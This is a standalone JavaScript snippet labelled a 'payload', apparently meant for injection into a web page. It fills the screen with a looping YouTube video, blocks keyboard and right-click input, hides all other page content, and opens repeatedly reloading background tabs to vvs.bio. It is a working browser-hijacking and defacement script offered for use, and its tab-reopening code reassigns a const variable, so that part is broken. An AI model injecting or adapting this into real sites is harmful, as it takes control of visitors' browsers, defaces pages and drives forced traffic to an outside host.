<script>
// Fullscreen YouTube Video Payload
const videoId = '_yZXPggxS18';
const iframe = document.createElement('iframe');
iframe.src = `https://www.youtube.com/embed/${videoId}?autoplay=1&loop=1&playlist=${videoId}&controls=0&disablekb=1&fs=0&modestbranding=1&rel=0&showinfo=0`;
iframe.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  z-index: 999999;
  border: none;
  pointer-events: none;
`;
iframe.allow = 'autoplay; fullscreen';
iframe.allowfullscreen = true;
document.body.appendChild(iframe);

// Block user controls
document.addEventListener('keydown', e => e.preventDefault(), true);
document.addEventListener('contextmenu', e => e.preventDefault(), true);

// Hide all other content
document.querySelectorAll('*:not(iframe)').forEach(el => {
  if (el !== iframe && el !== document.body && el !== document.documentElement) {
    el.style.display = 'none';
  }
});

// Open background tabs with continuous looping
const openLoopingTab = (url) => {
  const newTab = window.open(url, '_blank');
  if (newTab) {
    setInterval(() => {
      try {
        newTab.location.reload();
      } catch(e) {
        // Reopen if tab was closed
        newTab = window.open(url, '_blank');
      }
    }, 5000); // Refresh every 5 seconds
  }
};

// Open the requested URLs in background
openLoopingTab('https://vvs.bio/');
openLoopingTab('https://vvs.bio/falko');
</script>
